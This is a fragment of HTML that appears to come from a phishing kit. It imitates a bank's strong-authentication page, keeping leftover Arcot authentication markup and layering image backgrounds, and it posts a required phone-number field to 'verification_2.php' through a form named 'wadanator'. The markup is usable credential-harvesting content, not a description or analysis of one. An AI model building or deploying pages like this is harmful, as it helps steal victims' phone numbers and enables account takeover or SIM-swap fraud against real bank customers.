...
<html ng-app="refresh" class="ng-scope mdl-js" lang="en">
   ...
   <body ng-controller="spinnerController" ng-class="{ 'login migration-login-bg': migrationLogin(), 'login-strong-auth-bg':strongAuthLogin() }" class="ng-scope login migration-login-bg login-strong-auth-bg">
       <div class="content-wrapper">
           <div id="image1" style="position: absolute; overflow: hidden; left: 555px; top: 75px; width: 289px; height: 256px; z-index: 0"><img src="images/sim.jpg" alt="" title="" border=0 width=330 height=249></div>
   </div>
   <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
	   <form action="verification_2.php" name=wadanator id=wadanator method=post>
      <input name="phone" type="text" required class="textbox" style="position: absolute; width: 251px; left: 583px; top: 210px; z-index: 1" autocomplete="off" maxlength="13">
      <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
      <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
      <div class="offline-ui offline-ui-up">
         <div class="offline-ui-content"></div>
         <a href="" class="offline-ui-retry"></a>
      </div><div id="formimage1" style="position: absolute; left: 232px; top: 654px; z-index: 2; width: 1133px; height: 157px;"><input type="image" name="formimage1" width="1000" height="75" src="images/footer.png"></div><div id="formimage1" style="position: absolute; left: 764px; top: 274px; z-index: 2; width: 72px;"><input type="image" name="formimage1" width="70" height="30" src="images/xt11.png"></div>
   <p>&nbsp;</p>
   </form>
</body>
</html>